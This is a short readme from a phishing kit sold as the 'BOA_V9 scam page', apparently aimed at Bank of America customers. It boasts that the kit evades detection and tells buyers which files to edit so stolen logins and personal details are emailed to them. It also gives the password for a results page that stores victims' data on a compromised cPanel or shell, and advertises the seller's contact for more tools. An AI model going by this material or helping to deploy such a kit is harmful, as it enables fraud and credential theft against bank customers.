*******************************************************
* Thank you for buying BOA_V9 scam page               *
* This is a latest scam page in spam domain           *
* Also it's totaly clean                              *
* And undected :D                                     *
* So i hope you enjoy it and get resulta              *
*******************************************************
* Help center :                                       *
*   1- To show vus :  /Service/vu.txt                 *
*   2- To change email :                              *
*   > Change email in /Service/login/send/login.php   *
*   > Change email in /Service/login/send/info.php    *
*   3- For other things, more solution and other      *
*      tools you can contact me at :                  *
*       https://www.facebook.com/oussa.zidi.7         *
*******************************************************
* If your cpanel or shell doesn't work (ma ywasselech * 
* tabli8) Don't worry :D | I have solution for this   *
* There is an option in this scam page that you can   * 
* get resulta in html document uploaded in the        *
* cpanel or shell you will find it in :               *
*  /Service/login/resulta/                            *
* this resulta page is secured by password so that no *
* one can get your resulta password : boav9           *
* and to change password : /Service/login/index.php   *
* in line 30                                          *
*******************************************************